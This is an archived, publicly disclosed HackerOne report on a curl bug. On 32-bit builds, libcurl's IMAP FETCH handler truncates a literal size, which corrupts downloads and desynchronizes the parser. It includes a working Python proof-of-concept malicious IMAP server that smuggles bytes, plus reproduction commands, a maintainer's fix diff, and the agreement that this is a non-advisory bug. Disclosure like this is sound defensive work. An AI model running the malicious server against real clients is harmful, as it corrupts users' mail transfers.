---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - env/web
substate: "informative"
weakness: null
enriched: true
body: true
date: 2026-10-05
submitted: 2026-09-25T11:57:43.020Z
bounty_usd: null
votes: 9
cve: []
program: "[[programs/curl|curl]]"
reporter: "cyberfathy"
source: "https://hackerone.com/reports/4059104"
title: "IMAP literal size truncation on 32-bit platforms corrupts downloads and desynchronizes the response parser"
---
# IMAP literal size truncation on 32-bit platforms corrupts downloads and desynchronizes the response parser

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 9 | **Program:** curl | **Disclosed:** 2026-10-05

- Report: [https://hackerone.com/reports/4059104](https://hackerone.com/reports/4059104)
- CWE: N/A
- Submitted: 2026-09-25T11:57:43.020Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary

On 32-bit builds of libcurl, the IMAP FETCH handler truncates a server-announced literal size (`{size}`) from `curl_off_t` (64-bit) to `size_t` (32-bit) when it decides how many already-buffered bytes belong to the literal body. When a malicious or malfunctioning IMAP server announces a literal whose size is greater than `SIZE_MAX` (≥ 4 GiB on 32-bit), the low-32-bit remainder is used as the body boundary instead of the true size. Bytes the server sent as part of the literal are then dropped from the delivered body, and trailing bytes that arrive in the same buffer are re-interpreted by the IMAP response parser rather than treated as opaque literal data.

The result is silent corruption of the downloaded message and a state-machine desync between what the server sent and what the client parses as protocol. The code path is memory-safe (the truncation only ever makes the copied length *smaller* than the number of buffered bytes, so there is no out-of-bounds read), but it violates the integrity of the transfer.

This is a low-severity, 32-bit-only, post-authentication issue against a malicious server. I am reporting it as a correctness/security-hardening bug; the maintainers should decide whether it meets the bar for a security advisory.

## Affected

- **Product:** libcurl (IMAP/IMAPS)
- **Version tested:** 8.22.0 (also present in prior releases carrying the same code)
- **Precondition:** libcurl built for a platform where `sizeof(size_t) == 4` and `sizeof(curl_off_t) == 8` (typical 32-bit build with large-file support). 64-bit builds are unaffected because `size_t` is wide enough.
- **Attacker:** the IMAP server the client connects to (or a MITM able to inject IMAP responses on a non-TLS connection). The client must have completed login and issued a FETCH.

## Root cause

`lib/imap.c`, `imap_state_fetch_resp()` — literal handling. The server-announced size is parsed correctly into a 64-bit `curl_off_t size`, but the copy length is then computed with a narrowing cast:

```c
/* lib/imap.c ~1272-1280 */
size_t chunk = after_header;          /* bytes already buffered after the header line */
...
if(chunk > (size_t)size)              /* <-- size (curl_off_t) truncated to size_t */
  chunk = (size_t)size;
```

and again in the overflow path:

```c
/* lib/imap.c ~1447-1449 */
if(chunk > (size_t)size)
  /* The conversion from curl_off_t to size_t is always fine here */   /* <-- false on 32-bit */
  chunk = (size_t)size;
```

On a 32-bit build, `(size_t)size` for `size == 0x1_0000_000A` (4 GiB + 10) evaluates to `10`. `chunk` is clamped to 10 even though the literal continues far beyond that. The bytes beyond the truncated count are removed from the body and the code then treats subsequent buffered bytes as new protocol input (`pp->overflow` handling), desynchronizing the parser.

## Steps to reproduce

1. Build libcurl 8.22.0 as a 32-bit binary (e.g. in an `i386` Debian container):

   ```
   ./configure --without-ssl --disable-shared --enable-static \
       --disable-ldap --without-libpsl --without-nghttp2 CFLAGS="-m32 -g -O0"
   make
   src/curl -V     # -> "i686-...  Features: ... Largefile ..."
   ```

2. Run the minimal malicious IMAP server below. It answers login/SELECT normally, then for the FETCH sends, in a single write, a literal header announcing 4 GiB + 10 bytes, followed by 10 real body bytes and 48 bytes of trailing "smuggled" IMAP-looking data:

   ```python
   #!/usr/bin/env python3
   import socket, sys
   SIZE = 2**32 + 10                     # > SIZE_MAX on 32-bit
   K = SIZE & 0xffffffff                 # = 10, what a 32-bit client wrongly accepts
   BODY = b"A" * K
   SMUGGLED = b"* 1337 EXISTS\r\n* OK [ALERT] INJECTED-BY-SERVER\r\n"  # 48 bytes
   srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
   srv.bind(("127.0.0.1", 0)); srv.listen(1)
   print("PORT=%d" % srv.getsockname()[1], flush=True)
   c, _ = srv.accept(); c.sendall(b"* OK ready\r\n"); buf = b""
   while True:
       d = c.recv(4096)
       if not d: break
       buf += d
       while b"\r\n" in buf:
           line, buf = buf.split(b"\r\n", 1); tag = line.split(b" ", 1)[0]; up = line.upper()
           if b"CAPABILITY" in up:   c.sendall(b"* CAPABILITY IMAP4rev1\r\n" + tag + b" OK\r\n")
           elif b"LOGIN" in up:      c.sendall(tag + b" OK\r\n")
           elif b"SELECT" in up:     c.sendall(b"* 3 EXISTS\r\n" + tag + b" OK [READ-WRITE]\r\n")
           elif b"FETCH" in up:      c.sendall(b"* 1 FETCH (BODY[] {%d}\r\n" % SIZE + BODY + SMUGGLED)
                                     ; c.sendall(tag + b" OK FETCH complete\r\n")
           else:                     c.sendall(tag + b" OK\r\n")
   ```

3. Point both a 32-bit and a 64-bit curl at it:

   ```
   curl -v --max-time 5 "imap://user:pass@127.0.0.1:$PORT/INBOX;UID=1" -o body.bin
   ```

## Observed result

Identical server, identical bytes on the wire:

| Client | `body.bin` size | Content |
|---|---|---|
| 64-bit (correct) | **82 bytes** | `AAAAAAAAAA` + `* 1337 EXISTS\r\n* OK [ALERT] INJECTED-BY-SERVER\r\n` + `A004 OK FETCH complete\r\n` — everything after the header kept as opaque literal payload |
| 32-bit (bug) | **34 bytes** | `AAAAAAAAAA` + `A004 OK FETCH complete\r\n` — the 48-byte smuggled block is **gone**, and the tagged completion line is mis-delivered as body |

32-bit verbose trace:

```
< * 1 FETCH (BODY[] {4294967306}
* Found 4294967306 bytes to download
{ [10 bytes data]
* Written 10 bytes, 4294967296 bytes are left for transfer
{ [24 bytes data]
* Operation timed out ... with 34 out of 4294967306 bytes received
```

The 48 bytes missing from the 32-bit body (82 − 34) are exactly the smuggled block: they escaped the literal boundary because the boundary was computed as `(size_t)size == 10` instead of the true 4 GiB.

## Impact

- **Download integrity:** a 32-bit IMAP client silently receives a body that differs from what the server sent — bytes are dropped and unrelated bytes are inserted — with no error surfaced to the transfer as body corruption.
- **Parser desync:** server-controlled bytes that should be opaque literal data re-enter the IMAP response parser. In this PoC they are dropped; positioning attacker bytes at the reparse boundary to have the client accept a forged untagged/tagged response (response injection) is plausible but I have not built a working end-to-end injection.
- Not memory-unsafe: the clamp direction guarantees `chunk ≤ bytes_buffered`, so there is no over-read. Verified via an ASan+UBSan 64-bit build (clean) and by the 32-bit clamp always shrinking the copy.

## Timeline

- **Report Filed**
- **2026-09-25** @bagder: Thank you for your report!

The curl security team will now take some time and investigate your report and get back to you with details and possible follow-up questions as soon as we can! Most likely within the next 24 hours.

We always strive to fix reported problems as fast as possible. Issues with severity Low or Medium we merge into the next release in the ordinary release cycle. Only for more serious problems we might  release fix early.

If your report did not already mention how to reproduce this vulnerability, please consider providing this information to us.

Beware that there are **no** monetary rewards for curl vulnerabilities, no matter which severity.
- **2026-09-25** @bagder: Does this simple change fix the issue?

~~~diff
diff --git a/lib/imap.c b/lib/imap.c
index f06a20daf6..ea87021231 100644
--- a/lib/imap.c
+++ b/lib/imap.c
@@ -1437,11 +1437,11 @@ static CURLcode imap_state_fetch_resp(struct Curl_easy *data,
 
       /* keep only the overflow */
       curlx_dyn_tail(&pp->recvbuf, chunk);
       pp->nfinal = 0; /* done */
 
-      if(chunk > (size_t)size)
+      if((curl_off_t)chunk > size)
         /* The conversion from curl_off_t to size_t is always fine here */
         chunk = (size_t)size;
 
       if(!chunk) {
         /* no size, we are done with the data */
- **2026-09-25** @cyberfathy: Yes — that change fixes the FETCH download path this report is about.

if((curl_off_t)chunk > size) does the comparison in curl_off_t space, so a 32-bit wrap of (size_t)size no longer clamps chunk to the low 32 bits of a huge {size}. For {4294967306}, overflow bytes stay body instead of being reparsed as IMAP. When size actually fits in size_t and is smaller than chunk, the clamp still happens and chunk = (size_t)size is then valid.

That is imap_state_fetch_resp() around the overflow check (the site in your diff). That is the path used by imap://…/INBOX;UID=1.

The same narrowing is still present in imap_state_listsearch_resp():

if(chunk > (size_t)size)
  chunk = (size_t)size;

That is a different state (custom FETCH / UID FETCH listing). The original PoC does not hit it. Same 32-bit wrap if that path sees a huge literal.

Suggested: ship your FETCH-resp change, and apply the same compare at the listsearch site so both clamps stay in curl_off_t space. The comment that converting to size_t is always fine then holds for the assignment after the new compare.
- **2026-09-25** @bagder: PR: https://github.com/curl/curl/pull/23100
- **2026-09-25** @cyberfathy: Thanks
- **2026-09-25** @bagder: Because of the limiting factors, we want to consider this as "just a bug" and not a vulnerability.

- An attacker to exploit this needs to be a malicious server or a MITM, and such an attacker can already to much more harm than this
- This problem is limited to (extremely) rare 4GB IMAP downloads on 32-bit systems
- The problem is likely to be immediately noticeable if triggered by mistake and unlikely to cause a security problem then
- **2026-09-25** @cyberfathy: Agreed — treating this as a correctness bug is the right call.

The three limits you listed match what I saw: malicious/MITM server (already in a position to lie about the message), 32-bit + `{size}` > `SIZE_MAX`, and a truncated download that is obvious if it happens by accident. The clamp only ever shrinks the copy, so there is no memory-safety issue. I did not get a working response-injection past the FETCH state machine.

PR https://github.com/curl/curl/pull/23100 is the right fix: `if((curl_off_t)chunk > size)` in both `imap_state_fetch_resp()` and `imap_state_listsearch_resp()`. Happy to close this as a non-advisory bug once that lands.
- **Report Informative**
- **Agreed On Going Public**
- **Manually Disclosed**
